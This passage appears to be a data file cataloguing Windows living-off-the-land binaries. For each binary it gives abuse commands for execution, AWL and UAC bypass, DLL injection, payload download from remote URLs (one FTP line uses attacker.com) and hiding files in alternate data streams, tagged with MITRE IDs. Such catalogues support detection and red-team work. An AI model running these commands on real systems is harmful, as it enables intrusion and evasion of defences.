    commands: [{"cmd": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"", "desc": "Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder.", "usecase": "Use forfiles to start a new process to evade defensive counter measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{PATH_ABSOLUTE}:evil.exe\"", "desc": "Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder.", "usecase": "Use forfiles to start a new process from a binary hidden in an alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "fsi": {
    name: "Fsi.exe",
    description: "64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
    path: ["C:\\Program Files\\dotnet\\sdk\\<version>\\FSharp\\fsi.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe"],
    commands: [{"cmd": "fsi.exe {PATH:.fsscript}", "desc": "Execute F# code via script file", "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1059", "privileges": "User"}, {"cmd": "fsi.exe", "desc": "Execute F# code via interactive command line", "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1059", "privileges": "User"}]
  },
  "fsianycpu": {
    name: "FsiAnyCpu.exe",
    description: "32/64-bit FSharp (F#) Interpreter included with Visual Studio.",
    path: ["c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe"],
    commands: [{"cmd": "fsianycpu.exe {PATH:.fsscript}", "desc": "Execute F# code via script file", "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1059", "privileges": "User"}, {"cmd": "fsianycpu.exe", "desc": "Execute F# code via interactive command line", "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1059", "privileges": "User"}]
  },
  "fsutil": {
    name: "Fsutil.exe",
    description: "File System Utility",
    path: ["C:\\Windows\\System32\\fsutil.exe", "C:\\Windows\\SysWOW64\\fsutil.exe"],
    commands: [{"cmd": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}", "desc": "Zero out a file", "usecase": "Can be used to forensically erase a file", "category": "Tamper", "mitre": "T1485", "privileges": "User"}, {"cmd": "fsutil.exe usn deletejournal /d c:", "desc": "Delete the USN journal volume to hide file creation activity", "usecase": "Can be used to hide file creation activity", "category": "Tamper", "mitre": "T1485", "privileges": "User"}, {"cmd": "fsutil.exe trace decode", "desc": "Executes a pre-planted binary named netsh.exe from the current directory.", "usecase": "Spawn a pre-planted executable from fsutil.exe.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "ftp": {
    name: "Ftp.exe",
    description: "A binary designed for connecting to FTP servers",
    path: ["C:\\Windows\\System32\\ftp.exe", "C:\\Windows\\SysWOW64\\ftp.exe"],
    commands: [{"cmd": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt", "desc": "Executes the commands you put inside the text file.", "usecase": "Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"", "desc": "Download", "usecase": "Spawn new process using ftp.exe. Ftp.exe downloads the binary.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "gpscript": {
    name: "Gpscript.exe",
    description: "Used by group policy to process scripts",
    path: ["C:\\Windows\\System32\\gpscript.exe", "C:\\Windows\\SysWOW64\\gpscript.exe"],
    commands: [{"cmd": "Gpscript /logon", "desc": "Executes logon scripts configured in Group Policy.", "usecase": "Add local group policy logon script to execute file and hide from defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}, {"cmd": "Gpscript /startup", "desc": "Executes startup scripts configured in Group Policy", "usecase": "Add local group policy logon script to execute file and hide from defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "hh": {
    name: "Hh.exe",
    description: "Binary used for processing chm files in Windows",
    path: ["C:\\Windows\\hh.exe", "C:\\Windows\\SysWOW64\\hh.exe"],
    commands: [{"cmd": "HH.exe {REMOTEURL:.bat}", "desc": "Open the target batch script with HTML Help.", "usecase": "Download files from url", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "HH.exe {PATH_ABSOLUTE:.exe}", "desc": "Executes specified executable with HTML Help.", "usecase": "Execute process with HH.exe", "category": "Execute", "mitre": "T1218.001", "privileges": "User"}, {"cmd": "HH.exe {REMOTEURL:.chm}", "desc": "Executes a remote .chm file which can contain commands.", "usecase": "Execute commands with HH.exe", "category": "Execute", "mitre": "T1218.001", "privileges": "User"}]
  },
  "ie4uinit": {
    name: "Ie4uinit.exe",
    description: "Executes commands from a specially prepared ie4uinit.inf file.",
    path: ["c:\\windows\\system32\\ie4uinit.exe", "c:\\windows\\sysWOW64\\ie4uinit.exe", "c:\\windows\\system32\\ieuinit.inf", "c:\\windows\\sysWOW64\\ieuinit.inf"],
    commands: [{"cmd": "ie4uinit.exe -BaseSettings", "desc": "Executes commands from a specially prepared ie4uinit.inf file.", "usecase": "Get code execution by copy files to another location", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "iediagcmd": {
    name: "iediagcmd.exe",
    description: "Diagnostics Utility for Internet Explorer",
    path: ["C:\\Program Files\\Internet Explorer\\iediagcmd.exe"],
    commands: [{"cmd": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}", "desc": "Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe.", "usecase": "Spawn a pre-planted executable from iediagcmd.exe.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "ieexec": {
    name: "Ieexec.exe",
    description: "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe"],
    commands: [{"cmd": "ieexec.exe {REMOTEURL:.exe}", "desc": "Downloads and executes executable from the remote server.", "usecase": "Download and run attacker code from remote location", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "ieexec.exe {REMOTEURL:.exe}", "desc": "Downloads and executes executable from the remote server.", "usecase": "Download and run attacker code from remote location", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "ilasm": {
    name: "Ilasm.exe",
    description: "used for compile c# code into dll or exe.",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ilasm.exe"],
    commands: [{"cmd": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "desc": "Binary file used by .NET to compile C#/intermediate (IL) code to .exe", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}, {"cmd": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll", "desc": "Binary file used by .NET to compile C#/intermediate (IL) code to dll", "usecase": "A description of the usecase", "category": "Compile", "mitre": "T1127", "privileges": "User"}]
  },
  "imewdbld": {
    name: "IMEWDBLD.exe",
    description: "Microsoft IME Open Extended Dictionary Module",
    path: ["C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe"],
    commands: [{"cmd": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}", "desc": "IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "infdefaultinstall": {
    name: "Infdefaultinstall.exe",
    description: "Binary used to perform installation based on content inside inf files",
    path: ["C:\\Windows\\System32\\Infdefaultinstall.exe", "C:\\Windows\\SysWOW64\\Infdefaultinstall.exe"],
    commands: [{"cmd": "InfDefaultInstall.exe {PATH:.inf}", "desc": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.", "usecase": "Code execution", "category": "Execute", "mitre": "T1218", "privileges": "Admin"}]
  },
  "installutil": {
    name: "Installutil.exe",
    description: "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"],
    commands: [{"cmd": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "desc": "Execute the target .NET DLL or EXE.", "usecase": "Use to execute code and bypass application whitelisting", "category": "AWL Bypass", "mitre": "T1218.004", "privileges": "User"}, {"cmd": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "desc": "Execute the target .NET DLL or EXE.", "usecase": "Use to execute code and bypass application whitelisting", "category": "Execute", "mitre": "T1218.004", "privileges": "User"}, {"cmd": "InstallUtil.exe {REMOTEURL}", "desc": "It will download a remote payload and place it in INetCache.", "usecase": "Downloads payload from remote server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "intellitrace": {
    name: "IntelliTrace.exe",
    description: "Visual Studio command-line tool for collecting and managing diagnostic trace files.",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\IntelliTrace\\IntelliTrace.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\IntelliTrace\\IntelliTrace.exe"],
    commands: [{"cmd": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\"", "desc": "Launches an executable via Visual Studio command line utility.", "usecase": "Executes an executable under a trusted microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "iscsicpl": {
    name: "iscsicpl.exe",
    description: "Microsoft iSCSI Initiator Control Panel tool",
    path: ["c:\\windows\\system32\\iscsicpl.exe", "c:\\windows\\syswow64\\iscsicpl.exe"],
    commands: [{"cmd": "c:\\windows\\syswow64\\iscsicpl.exe", "desc": "c:\\windows\\syswow64\\iscsicpl.exe has a DLL injection through `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\WindowsApps\\ISCSIEXE.dll`, resulting in UAC bypass.", "usecase": "Execute a custom DLL via a trusted high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}, {"cmd": "iscsicpl.exe", "desc": "Both `c:\\windows\\system32\\iscsicpl.exe` and `c:\\windows\\system64\\iscsicpl.exe` have UAC bypass through launching iscicpl.exe, then navigating into the Configuration tab, clicking Report, then launching your custom command.", "usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}]
  },
  "jsc": {
    name: "Jsc.exe",
    description: "Binary file used by .NET to compile JavaScript code to .exe or .dll format",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Jsc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Jsc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Jsc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Jsc.exe"],
    commands: [{"cmd": "jsc.exe {PATH:.js}", "desc": "Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}, {"cmd": "jsc.exe /t:library {PATH:.js}", "desc": "Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}]
  },
  "launch-vsdevshell": {
    name: "Launch-VsDevShell.ps1",
    description: "Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
    path: ["C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1", "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1"],
    commands: [{"cmd": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}", "desc": "Execute binaries from the context of the signed script using the \"VsWherePath\" flag.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}, {"cmd": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\"", "desc": "Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "ldifde": {
    name: "Ldifde.exe",
    description: "Creates, modifies, and deletes LDAP directory objects.",
    path: ["c:\\windows\\system32\\ldifde.exe", "c:\\windows\\syswow64\\ldifde.exe"],
    commands: [{"cmd": "Ldifde -i -f {PATH:.ldf}", "desc": "Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1105", "privileges": "Administrator"}]
  },
  "logger": {
    name: "Logger.exe",
    description: "A logging configuration tool from the Windows Kits used to start and manage process logging.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\logger.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\logger.exe", "C:\\Program Files\\Windows Kits\\10\\Debuggers\\x86\\logger.exe", "C:\\Program Files\\Windows Kits\\10\\Debuggers\\x64\\logger.exe"],
    commands: [{"cmd": "logger.exe RUN \"{CMD}\"", "desc": "Executes the command specified after the `RUN` parameter as a child of `logger.exe`.", "usecase": "Executes an abitrary command via a signed binary to evade detection.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "logger.exe RUNW \"{CMD}\"", "desc": "Executes the command specified after the `RUNW` parameter as a child of `logger.exe`.", "usecase": "Executes an abitrary command via a signed binary to evade detection.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "logger.exe \"{CMD}\"", "desc": "Executes the command specified as a child of `logger.exe`.", "usecase": "Executes an abitrary command via a signed binary to evade detection.", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "makecab": {
    name: "Makecab.exe",
    description: "Binary to package existing files into a cabinet (.cab) file",
    path: ["C:\\Windows\\System32\\makecab.exe", "C:\\Windows\\SysWOW64\\makecab.exe"],
    commands: [{"cmd": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab", "desc": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.", "usecase": "Hide data compressed into an alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab", "desc": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.", "usecase": "Hide data compressed into an alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "desc": "Download and compresses the target file and stores it in the target file.", "usecase": "Download file and compress into a cab file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "makecab /F {PATH:.ddf}", "desc": "Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.", "usecase": "Bypass command-line based detections", "category": "Execute", "mitre": "T1036", "privileges": "User"}]
  },
  "manage-bde": {
    name: "Manage-bde.wsf",
    description: "Script for managing BitLocker",
    path: ["C:\\Windows\\System32\\manage-bde.wsf"],
    commands: [{"cmd": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf", "desc": "Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.", "usecase": "Proxy execution from script", "category": "Execute", "mitre": "T1216", "privileges": "User"}, {"cmd": "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf", "desc": "Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.", "usecase": "Proxy execution from script", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "mavinject": {
    name: "Mavinject.exe",
    description: "Used by App-v in Windows",
    path: ["C:\\Windows\\System32\\mavinject.exe", "C:\\Windows\\SysWOW64\\mavinject.exe"],
    commands: [{"cmd": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}", "desc": "Inject evil.dll into a process with PID 3110.", "usecase": "Inject dll file into running process", "category": "Execute", "mitre": "T1218.013", "privileges": "User"}, {"cmd": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll", "desc": "Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172", "usecase": "Inject dll file into running process", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "mftrace": {
    name: "Mftrace.exe",
    description: "Trace log generation tool for Media Foundation Tools.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x86\\mftrace.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x64\\mftrace.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x86\\mftrace.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\mftrace.exe"],
    commands: [{"cmd": "Mftrace.exe {PATH:.exe}", "desc": "Launch specified executable as a subprocess of Mftrace.exe.", "usecase": "Local execution of cmd.exe as a subprocess of Mftrace.exe.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "microsoft.nodejstools.pressanykey": {
    name: "Microsoft.NodejsTools.PressAnyKey.exe",
    description: "Part of the NodeJS Visual Studio tools.",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\Extensions\\Microsoft\\NodeJsTools\\NodeJsTools\\Microsoft.NodejsTools.PressAnyKey.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\Extensions\\Microsoft\\NodeJsTools\\NodeJsTools\\Microsoft.NodejsTools.PressAnyKey.exe"],
    commands: [{"cmd": "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}", "desc": "Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.", "usecase": "Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "microsoft.workflow.compiler": {
    name: "Microsoft.Workflow.Compiler.exe",
    description: "A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
    path: ["C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe"],
    commands: [{"cmd": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}", "desc": "Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).", "usecase": "Compile and run code", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}", "desc": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.", "usecase": "Compile and run code", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}", "desc": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.", "usecase": "Compile and run code", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "mmc": {
    name: "Mmc.exe",
    description: "Load snap-ins to locally and remotely manage Windows systems",
    path: ["C:\\Windows\\System32\\mmc.exe", "C:\\Windows\\SysWOW64\\mmc.exe"],
    commands: [{"cmd": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "desc": "Launch a 'backgrounded' MMC process and invoke a COM payload", "usecase": "Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry", "category": "Execute", "mitre": "T1218.014", "privileges": "User"}, {"cmd": "mmc.exe gpedit.msc", "desc": "Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.", "usecase": "Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.", "category": "UAC Bypass", "mitre": "T1218.014", "privileges": "Administrator"}, {"cmd": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "desc": "Download and save an executable to disk", "usecase": "Download file from Internet", "category": "Download", "mitre": "T1218.014", "privileges": "User"}]
  },
  "mpcmdrun": {
    name: "MpCmdRun.exe",
    description: "Binary part of Windows Defender. Used to manage settings in Windows Defender",
    path: ["C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.4-0\\MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.7-0\\MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe", "C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23110.3-0\\X86\\MpCmdRun.exe"],
    commands: [{"cmd": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}", "desc": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)", "usecase": "Download file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe", "desc": "Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.", "usecase": "Download file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe", "desc": "Download file to machine and store it in Alternate Data Stream", "usecase": "Hide downloaded data into an Alternate Data Stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "mpiexec": {
    name: "Mpiexec.exe",
    description: "Command-line tool for running Message Passing Interface (MPI) applications.",
    path: ["C:\\Program Files\\Microsoft MPI\\Bin\\mpiexec.exe", "C:\\Program Files (x86)\\Microsoft MPI\\Bin\\mpiexec.exe"],
    commands: [{"cmd": "mpiexec.exe {CMD}", "desc": "Executes a command via MPI command-line tool.", "usecase": "Executes commands under a trusted, Microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "msaccess": {
    name: "MSAccess.exe",
    description: "Microsoft Office component",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSAccess.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSAccess.exe", "C:\\Program Files\\Microsoft Office\\Office16\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSAccess.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\MSAccess.exe", "C:\\Program Files\\Microsoft Office\\Office15\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\MSAccess.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\MSAccess.exe", "C:\\Program Files\\Microsoft Office\\Office14\\MSAccess.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office12\\MSAccess.exe", "C:\\Program Files\\Microsoft Office\\Office12\\MSAccess.exe"],
    commands: [{"cmd": "MSAccess.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "msbuild": {
    name: "Msbuild.exe",
    description: "Used to compile and execute code",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Msbuild.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Msbuild.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\Msbuild.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\Msbuild.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe", "C:\\Program Files (x86)\\MSBuild\\14.0\\bin\\MSBuild.exe"],
    commands: [{"cmd": "msbuild.exe {PATH:.xml}", "desc": "Build and execute a C# project stored in the target XML file.", "usecase": "Compile and run code", "category": "AWL Bypass", "mitre": "T1127.001", "privileges": "User"}, {"cmd": "msbuild.exe {PATH:.csproj}", "desc": "Build and execute a C# project stored in the target csproj file.", "usecase": "Compile and run code", "category": "Execute", "mitre": "T1127.001", "privileges": "User"}, {"cmd": "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo", "desc": "Executes generated Logger DLL file with TargetLogger export.", "usecase": "Execute DLL", "category": "Execute", "mitre": "T1127.001", "privileges": "User"}, {"cmd": "msbuild.exe {PATH:.proj}", "desc": "Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.", "usecase": "Execute project file that contains XslTransformation tag parameters", "category": "Execute", "mitre": "T1127.001", "privileges": "User"}, {"cmd": "msbuild.exe @{PATH:.rsp}", "desc": "By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.", "usecase": "Bypass command-line based detections", "category": "Execute", "mitre": "T1036", "privileges": "User"}]
  },
  "msconfig": {
    name: "Msconfig.exe",
    description: "MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
    path: ["C:\\Windows\\System32\\msconfig.exe"],
    commands: [{"cmd": "Msconfig.exe -5", "desc": "Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml.", "usecase": "Code execution using Msconfig.exe", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "msdeploy": {
    name: "Msdeploy.exe",
    description: "Microsoft tool used to deploy Web Applications.",
    path: ["C:\\Program Files\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe", "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe", "C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe", "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe", "C:\\Program Files\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe", "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe", "C:\\Program Files\\IIS\\Microsoft Web Deploy V5\\msdeploy.exe", "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V5\\msdeploy.exe"],
    commands: [{"cmd": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"", "desc": "Launch .bat file via msdeploy.exe.", "usecase": "Local execution of batch file using msdeploy.exe.", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"", "desc": "Launch .bat file via msdeploy.exe.", "usecase": "Local execution of batch file using msdeploy.exe.", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}", "desc": "Copy file from source to destination.", "usecase": "Copy file.", "category": "Copy", "mitre": "T1105", "privileges": "User"}]
  },
  "msdt": {
    name: "Msdt.exe",
    description: "Microsoft diagnostics tool",
    path: ["C:\\Windows\\System32\\Msdt.exe", "C:\\Windows\\SysWOW64\\Msdt.exe"],
